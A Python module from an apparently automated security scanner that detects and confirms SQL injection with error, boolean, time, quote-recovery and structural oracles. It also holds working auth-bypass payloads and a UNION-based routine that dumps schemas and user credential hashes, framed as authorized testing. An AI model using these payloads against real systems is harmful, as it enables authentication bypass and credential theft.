"""
SQL-injection detection — three confirmed oracles, no destructive payloads.

A native complement to run_sqlmap (which needs the binary). Every signal is
confirmed against a baseline so it does not cry wolf:

  1. Error-based: inject a syntax-breaking quote and detect a DBMS error
     signature that the baseline response did not carry (also fingerprints the
     DBMS: MySQL/Postgres/MSSQL/Oracle/SQLite).

  2. Boolean-based blind: send an always-TRUE vs always-FALSE condition; if TRUE
     tracks the baseline while FALSE diverges, the parameter changes the query's
     result set — injectable even with no error and no reflection.

  3. Time-based blind: a SLEEP/pg_sleep/WAITFOR payload with a matching sleep(0)
     control; confirmed only when the delayed request is slower than the control
     by ~the injected time (rules out network jitter).

Payloads are read-only (SELECT-side boolean/time tests) — no stacked writes.
Pure/deterministic and unit-tested; tools._run_sqli does the transport + timing.
"""
from __future__ import annotations

import re
from difflib import SequenceMatcher

# ── DBMS error signatures (content-only; absent from normal pages) ──
DBMS_ERRORS = {
    "MySQL": [r"SQL syntax.*MySQL", r"You have an error in your SQL syntax",
              r"check the manual that corresponds to your (?:MySQL|MariaDB)", r"MySqlException",
              r"valid MySQL result", r"mysql_fetch", r"Unknown column '[^']+' in 'field list'"],
    "PostgreSQL": [r"PostgreSQL.*ERROR", r"PSQLException", r"unterminated quoted string at or near",
                   r"syntax error at or near", r"invalid input syntax for"],
    "Microsoft SQL Server": [r"Unclosed quotation mark after the character string", r"Microsoft OLE DB Provider",
                             r"Microsoft SQL Native Client", r"System\.Data\.SqlClient\.SqlException",
                             r"Incorrect syntax near", r"\bODBC SQL Server Driver\b"],
    "Oracle": [r"\bORA-\d{5}", r"Oracle error", r"quoted string not properly terminated",
               r"Oracle.*Driver", r"PLS-\d{5}"],
    "SQLite": [r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite\.SQLiteException",
               r"unrecognized token:", r"SQLITE_ERROR", r"near \".*\": syntax error", r"sqlite3\.OperationalError"],
}

ERROR_PROBES = ["'", "\"", "')", "\"))", "`"]


def error_signatures(baseline_body: str, probe_body: str) -> list:
    """DBMS error signatures present for the probe but not the baseline."""
    base, body = baseline_body or "", probe_body or ""
    hits = []
    for dbms, pats in DBMS_ERRORS.items():
        for p in pats:
            rx = re.compile(p, re.I)
            if rx.search(body) and not rx.search(base):
                hits.append({"dbms": dbms, "pattern": p})
                break
    return hits


# ── quote-break / recovery (status differential — no DBMS text needed) ──
def quote_break_recovers(base_status: int, single_status: int, double_status: int) -> bool:
    """Classic quote-injection signature that needs NO leaked SQL text: a benign
    value works, a single quote breaks the query into a SERVER ERROR (5xx) the
    baseline did not have, and DOUBLING the quote (escaping it) recovers to a
    non-error. The break+recover pair is what rules out a generic 500 — the
    parameter is concatenated straight into SQL."""
    return base_status < 500 and single_status >= 500 and 200 <= double_status < 500


def quote_recovery_finding(url: str, param: str, base_status: int,
                           single_status: int, double_status: int) -> dict:
    return _base(url, param, "error-recovery", "high",
                 (f"A single quote in '{param}' changed the response from HTTP {base_status} to {single_status} "
                  f"(server error), and doubling the quote recovered it to HTTP {double_status}. The quote breaks "
                  "the SQL statement and escaping it restores it, so the value is concatenated into a query."),
                 f"HTTP {base_status} (benign) -> {single_status} (single quote) -> {double_status} (doubled quote)",
                 [f"Set '{param}' to VALUE'  — server error (HTTP {single_status})",
                  f"Set '{param}' to VALUE'' — recovers (HTTP {double_status})",
                  "Confirm/exploit with a boolean or UNION payload (authorized testing only)"])


# ── boolean-based blind ──────────────────────────────────────────
_COMMENTS = ("-- -", "#", "-- ")


def boolean_payloads(value: str) -> list:
    v = value or ""
    out = [
        {"ctx": "string-quote", "true": f"{v}' AND '1'='1", "false": f"{v}' AND '1'='2"},
        {"ctx": "string-comment", "true": f"{v}' AND 1=1-- -", "false": f"{v}' AND 1=2-- -"},
        {"ctx": "numeric", "true": f"{v} AND 1=1", "false": f"{v} AND 1=2"},
        {"ctx": "paren-quote", "true": f"{v}') AND ('1'='1", "false": f"{v}') AND ('1'='2"},
    ]
    return out


def similar(a: str, b: str) -> float:
    return SequenceMatcher(None, a or "", b or "").ratio()


BOOLEAN_BASELINE_SAMPLE_COUNT = 2
_MISSING = object()
_MISSING_BASELINE_REPEAT = _MISSING      # kept: existing callers/tests import this name


def analyze_boolean(baseline: str, true_body: str, false_body: str, thresh: float = 0.95,
                    *, baseline_repeat=_MISSING, baseline_samples=None,
                    false_repeat=_MISSING) -> bool:
    """Injectable when a REPRODUCIBLE reference and TRUE agree while FALSE diverges.

    THE REFERENCE MUST REPRODUCE EXACTLY, NOT MERELY SIMILARLY (Q-040).
    ----------------------------------------------------------------------
    The reference requests are identical by construction -- same URL, same method, same
    body, same value, no payload. On an endpoint this oracle can measure at all, they
    MUST come back byte-identical. Any difference between them is direct evidence that
    the endpoint's output is not a function of its input, and on such an endpoint a
    similarity differential cannot distinguish "the payload changed the result set" from
    "the page changed on its own". So a non-reproducing reference is refused outright.

    The previous gate accepted ``similar(b1, b2) >= thresh``, which is a threshold on
    noise rather than a test for its absence, and MEASURED against the OWASP Benchmark
    lab it let two live false positives through (breaker.md SESSION 4, TARGET 2):

        BenchmarkTest00023  weakrand, a fresh java.util.Random value in every response
                            12 distinct bodies in 12 identical requests, pairwise
                            0.9495..0.9766 -- every pair cleared a 0.95 threshold, so the
                            gate contributed NOTHING: FP/attempt 0.045 -> 0.045.
                            Requiring reproduction takes it to 0.000.
        BenchmarkTest00494  two alternating resolver strings at 0.9091. See the residual
                            note below -- equality does not close this one, and it is not
                            closable at this call signature.

    Cost, measured on the same lab: NONE. All five genuine boolean-blind confirmations
    (00033/00428/00429/00433/00438) return ONE distinct body over 12 identical requests,
    so they reproduce exactly and are unaffected. Off the benchmark the cost is real and
    is a deliberate false negative: an endpoint carrying a per-response CSRF token,
    timestamp or request id will now be declined by this oracle rather than guessed at.
    That is the intended direction -- on such a page a boolean confirmation was never
    evidence, it was a coin flip whose bias nobody had measured.

    THE RESIDUAL, stated because it is provable rather than merely unfixed.
    ----------------------------------------------------------------------
    With only (baseline, one repeat, true, false) the ``BenchmarkTest00494`` shape is
    UNDECIDABLE, not merely undetected. The tuple ``(A, A, A, B)`` is produced both by
      * a genuine injection on a deterministic page -- baseline A, TRUE returns the
        baseline result set A, FALSE returns the empty result set B; and
      * a page alternating A/B whose state happened to flip after the third request.
    Identical inputs, opposite ground truth: no function of those four strings can
    separate them. Separating them requires ANOTHER OBSERVATION, which is what the two
    optional arguments below are for. ``test_sqli_boolean_noise_floor`` carries this as
    an executable proof.

    ``baseline_samples``  further responses to the same unprobed request. Supply at least
                          one taken AFTER the true/false pair: the reference then spans
                          the probe window, and the two ways of getting a confirmation
                          become mutually exclusive -- either the page held one state
                          across the window (so TRUE and FALSE are in it too, and there is
                          no divergence to report) or it flipped (and the after-probe
                          sample no longer reproduces, so the oracle declines).
    ``false_repeat``      the FALSE payload sent a second time. A real differential
                          reproduces; a state flip usually does not.

    Both are optional and additive, so callers that cannot supply them keep working.
    ``None`` means "the request was attempted and failed", and is refused -- the same
    convention ``baseline_repeat=None`` already had. Omitted means "not attempted".
    """
    refs = None
    if baseline_samples is not None:
        refs = [baseline] + list(baseline_samples)
    elif baseline_repeat is not _MISSING:
        refs = [baseline, baseline_repeat]
    if refs is not None:
        # A failed reference request proves nothing either way; refuse rather than guess.
        if len(refs) < 2 or any(r is None for r in refs):
            return False
        # THE TEST FOR NON-DETERMINISM, not a threshold on how much of it is tolerable.
        if any(r != refs[0] for r in refs):
            return False
    st = similar(baseline, true_body)
    stf = similar(true_body, false_body)
    if not (st >= thresh and stf < thresh):
        return False
    if false_repeat is not _MISSING:
        # The divergence has to happen twice. A one-off state change is not a result.
        if false_repeat is None or similar(true_body, false_repeat) >= thresh:
            return False
    return True


# ── time-based blind ─────────────────────────────────────────────
def time_payloads(value: str, seconds: int) -> list:
    v = value or ""
    return [
        {"dbms": "MySQL", "payload": f"{v}' AND SLEEP({seconds})-- -", "control": f"{v}' AND SLEEP(0)-- -"},
        {"dbms": "MySQL", "payload": f"{v} AND SLEEP({seconds})", "control": f"{v} AND SLEEP(0)"},
        {"dbms": "PostgreSQL", "payload": f"{v}' AND pg_sleep({seconds})-- -", "control": f"{v}' AND pg_sleep(0)-- -"},
        {"dbms": "Microsoft SQL Server", "payload": f"{v}'; WAITFOR DELAY '0:0:{seconds}'-- -",
         "control": f"{v}'; WAITFOR DELAY '0:0:0'-- -"},
    ]


def analyze_time(control_elapsed: float, sleep_elapsed: float, seconds: int, margin: float = 0.6) -> bool:
    """Confirmed when the sleep request is slower than its control by ~the injected
    delay (and the control itself was fast) — jitter cannot fake this."""
    need = seconds * margin
    return sleep_elapsed - control_elapsed >= need and sleep_elapsed >= need


# ── finding builders ─────────────────────────────────────────────
def _base(url: str, param: str, oracle: str, sev: str, desc: str, evidence: str, steps: list) -> dict:
    return {
        "title": f"SQL injection ({oracle}) in '{param}'", "severity": sev, "target": url,
        "description": desc,
        "impact": ("Read or modify the database: dump credentials/PII, bypass authentication, and — depending on "
                   "privileges — write files or execute commands on the DB host."),
        "reproduction_steps": steps, "evidence": evidence, "cwe": "CWE-89",
        "family": "sqli", "tags": ["sqli", oracle], "confidence": "confirmed",
    }


def error_finding(url: str, param: str, probe: str, dbms_hits: list) -> dict:
    dbms = ", ".join(sorted({h["dbms"] for h in dbms_hits}))
    return _base(url, param, "error-based", "high",
                 (f"Injecting {probe!r} into '{param}' produced a {dbms} SQL error absent from the baseline, so the "
                  "parameter is concatenated into a SQL statement."),
                 f"{dbms} error triggered by {probe!r}",
                 [f"Set '{param}' to a value ending in {probe!r}",
                  f"Observe a {dbms} SQL error in the response",
                  "Extract data with a UNION/error-based query (authorized testing only)"])


def boolean_finding(url: str, param: str, pair: dict) -> dict:
    return _base(url, param, "boolean-blind", "high",
                 (f"For '{param}', an always-true condition ({pair['true']!r}) returned the baseline page while an "
                  f"always-false one ({pair['false']!r}) returned a different page. The condition reaches the query "
                  "(blind SQLi)."),
                 f"TRUE≈baseline, FALSE diverged ({pair['ctx']})",
                 [f"Set '{param}' to {pair['true']!r} — normal page",
                  f"Set '{param}' to {pair['false']!r} — different page",
                  "Extract data one boolean at a time (substring/ASCII)"])


# ── auth-bypass SQLi (POST/JSON body — e.g. a login email field) ─────────────
# Payloads that neutralise the WHERE clause of a login query so the first row is
# returned without valid credentials. High-value: this is the canonical API/login
# SQLi that query-string probes never reach.
AUTH_BYPASS_PAYLOADS = ["' OR 1=1--", "' OR '1'='1'--", "' OR 1=1#", "admin'--",
                        "') OR ('1'='1'--", "\" OR 1=1--"]

# request-body field names worth injecting for an auth bypass
LOGIN_FIELD_HINTS = ("email", "username", "user", "login", "userid", "user_name", "account")

_LOGIN_PATH = re.compile(r"(login|signin|sign-in|authenticate|authentication|session|token|auth)\b", re.I)


def looks_like_login(path_or_url: str) -> bool:
    """True when a path/URL looks like a credential-checking endpoint worth an
    auth-bypass body probe (deterministic, no network)."""
    return bool(_LOGIN_PATH.search(path_or_url or ""))


def auth_bypass_confirmed(base_status: int, base_body: str,
                          inj_status: int, inj_body: str) -> dict:
    """Decide whether a login body-injection actually bypassed auth, comparing the
    injected response to a benign baseline. Returns {} when not confirmed.
    Signals (any, only when the baseline did NOT already have them): a session/JWT
    token or an authentication object appears, or a rejected 401/403 flips to 200."""
    b, i = (base_body or ""), (inj_body or "")
    tok = re.compile(r'"(authentication|token|access_token|authorization)"\s*:|'
                     r'\beyJ[A-Za-z0-9_-]{10,}\.', re.I)
    base_has = bool(tok.search(b))
    inj_has = bool(tok.search(i))
    if inj_has and not base_has:
        return {"signal": "session/JWT token issued for an invalid credential", "how": "token"}
    if base_status in (401, 403, 400) and inj_status == 200 and len(i) > len(b):
        return {"signal": f"login rejected ({base_status}) but the injection returned 200", "how": "status"}
    return {}


def auth_bypass_finding(url: str, field: str, payload: str, signal: str) -> dict:
    f = _base(url, field, "auth-bypass", "critical",
              (f"A SQL-injection payload in the '{field}' body field of a login request "
               f"bypassed authentication: {signal}. The field is concatenated into the "
               "authentication query, so its WHERE clause can be neutralised."),
              f"{signal} via {field}={payload!r}",
              [f"POST the login request with '{field}' set to {payload!r}",
               "Observe authentication succeed without valid credentials (token issued / 200)",
               "Log in as the first/admin account, or enumerate users via UNION"])
    f["impact"] = ("Full authentication bypass: sign in as any user (typically the first/admin row) "
                   "without credentials, then read or modify that account's data.")
    return f


# ── UNION-based extraction: escalate a CONFIRMED injection into proof-by-data ─────
# This is the difference between "there is an injection here" and "here is the data it
# leaks". Deterministic and read-only (UNION SELECT only, no writes). Generic across
# the injection CONTEXT (the closing that balances the query) and column count, and
# generic across schema (dumps the DB's own catalogue, finds a users-like table by
# name, reads its e-mail/secret-like columns) — nothing target-specific is hardcoded.
UNION_MARK = "ap0lakiUX"
# Common ways a string literal is embedded in a WHERE clause; the one that BALANCES the
# query is discovered empirically by marker reflection. Ordered most→least common.
UNION_CLOSINGS = ("'))", "')", "'", '"))', '")', '"', ")", "")


def union_count_probe(value: str, closing: str, ncols: int, mark: str = UNION_MARK) -> str:
    cols = ",".join("'%s'" % mark for _ in range(ncols))
    return "%s%s UNION SELECT %s-- -" % (value, closing, cols)


def union_extract_probe(value: str, closing: str, ncols: int, expr: str,
                        mark: str = UNION_MARK) -> str:
    # expr goes in column 1; the marker fills the rest so the injected row is locatable.
    cols = [expr] + ["'%s'" % mark for _ in range(max(0, ncols - 1))]
    return "%s%s UNION SELECT %s-- -" % (value, closing, ",".join(cols))


def union_hit(body: str, mark: str = UNION_MARK) -> bool:
    return bool(body) and mark in body


def schema_exprs() -> list:
    """Catalogue-dump expressions, most portable first (sqlite, then MySQL/Postgres)."""
    return [
        "(SELECT group_concat(sql,'~~') FROM sqlite_master WHERE type='table')",
        "(SELECT group_concat(table_name,'~~') FROM information_schema.tables)",
    ]


_USERS_TABLE_RE = re.compile(
    r'CREATE TABLE [`"\[]?(\w*(?:user|account|member|credential|login)\w*)', re.I)


def parse_users_table(schema_body: str):
    m = _USERS_TABLE_RE.search(schema_body or "")
    return m.group(1) if m else None


def parse_columns(schema_body: str, table: str) -> list:
    m = re.search(r'CREATE TABLE [`"\[]?%s[`"\]]?\s*\((.*)' % re.escape(table),
                  schema_body or "", re.I | re.S)
    if not m:
        return []
    return re.findall(r'[`"\[]?(\w+)[`"\]]?\s+(?:INTEGER|TEXT|VARCHAR|CHAR|BLOB|REAL|NUMERIC|DATE)',
                      m.group(1)[:2000], re.I)


def creds_expr(table: str, cols: list):
    """Build an email||':'||password style dump from the users table's real columns."""
    low = [c.lower() for c in cols]
    def pick(hints, default):
        for i, c in enumerate(low):
            if any(h in c for h in hints):
                return cols[i]
        return default
    idc = pick(("mail", "email", "user", "login", "name"), cols[0] if cols else "email")
    pwc = pick(("pass", "pwd", "secret", "hash", "token"), "password")
    return "(SELECT group_concat(%s||':'||%s) FROM %s)" % (idc, pwc, table)


_CRED_RE = re.compile(r'[\w.+-]+@[\w.-]+:[0-9a-fA-F]{16,}')


def parse_creds(body: str) -> list:
    return _CRED_RE.findall(body or "")


def parse_tables(schema_body: str) -> list:
    return re.findall(r'CREATE TABLE [`"\[]?(\w+)', schema_body or "", re.I)


def union_finding(url: str, param: str, ncols: int, closing: str, tables: list,
                  cred_sample: list) -> dict:
    # Redact the extracted secrets: keep enough to prove the dump, never the full hash.
    red = [c.split(":")[0] + ":" + (c.split(":", 1)[1][:6] + "…") for c in cred_sample[:3]]
    tbl = ", ".join(tables[:12])
    ev = ("UNION SELECT balanced with closing %r at %d columns.\nDB tables: %s"
          % (closing, ncols, tbl))
    if red:
        ev += "\nExtracted credentials (redacted): " + " ; ".join(red)
    f = _base(url, param, "union-extraction", "critical",
              (f"The confirmed injection in '{param}' was escalated with a UNION SELECT that "
               "returned attacker-chosen rows from the database — the query context was balanced "
               f"(closing {closing!r}, {ncols} columns) and the database catalogue and a "
               "users table were read out."),
              ev,
              [f"Balance the query: append {closing} then `UNION SELECT` with {ncols} columns",
               "Read the schema from the DB catalogue (e.g. sqlite_master / information_schema)",
               "Dump the users table's identifier + secret columns"])
    f["impact"] = ("Full read access to the database: dump every user's credentials and all "
                   "application data. Extracted rows are proof the injection is exploitable, not "
                   "merely present.")
    f["extracted_tables"] = tables[:20]
    return f


def time_finding(url: str, param: str, item: dict, control_elapsed: float, sleep_elapsed: float, seconds: int) -> dict:
    return _base(url, param, "time-blind", "critical",
                 (f"For '{param}', a {item['dbms']} sleep payload delayed the response to {sleep_elapsed:.1f}s vs "
                  f"{control_elapsed:.1f}s for the sleep(0) control (~{seconds}s injected). The parameter is injectable "
                  "(blind SQLi)."),
                 f"{item['dbms']}: {sleep_elapsed:.1f}s vs control {control_elapsed:.1f}s (injected {seconds}s)",
                 [f"Set '{param}' to {item['payload']!r}",
                  f"Observe the response takes ~{seconds}s longer than the sleep(0) control",
                  "Extract data via time-based boolean inference"])


# ── structural / ORDER BY injection (WAHH ch9) ───────────────────────────────
# Input placed into the query STRUCTURE (ORDER BY / column position / sort dir) is unquoted, so the
# quote-break data-context oracle never fires and — crucially — prepared statements do NOT protect it.
# WAHH flags this as a key modern vector. Confirmation is a SUBQUERY DIFFERENTIAL that a non-SQL context
# cannot fake: a VALID subquery runs clean while an INVALID one raises a DBMS error absent from the baseline.
def structural_probes() -> dict:
    return {"ok": "(SELECT 1)", "bad": "(SELECT 1 FROM apolnope_zqx77)"}


def structural_confirmed(baseline_body: str, ok_body: str, bad_body: str):
    """(confirmed, dbms_hits): confirmed when the INVALID subquery errors (DBMS signature not in baseline) but
    the VALID subquery does NOT. A context that merely reflects/ignores the value, or errors on ANY invalid
    column name, gives the SAME result for both -> no differential -> no false positive."""
    bad_hits = error_signatures(baseline_body, bad_body)
    ok_hits = error_signatures(baseline_body, ok_body)
    return (bool(bad_hits) and not ok_hits), bad_hits


def structural_finding(url: str, param: str, dbms_hits: list) -> dict:
    dbms = ", ".join(sorted({h["dbms"] for h in dbms_hits})) or "SQL"
    return _base(url, param, "structural/ORDER BY", "high",
                 (f"'{param}' is placed into the query STRUCTURE (e.g. an ORDER BY / column position), not a "
                  f"quoted data value. A valid subquery ran cleanly while an invalid one raised a {dbms} error, "
                  "so the input is evaluated as SQL. Note: parameterised queries do NOT protect this context."),
                 f"(SELECT 1) ran clean; (SELECT 1 FROM <nonexistent>) -> {dbms} error not in baseline",
                 [f"Set '{param}' to (SELECT 1) — normal response",
                  f"Set '{param}' to (SELECT 1 FROM <nonexistent-table>) — a {dbms} error appears",
                  "Escalate with boolean inference: replace the column with (SELECT 1 WHERE <cond> OR 1/0=0)"])
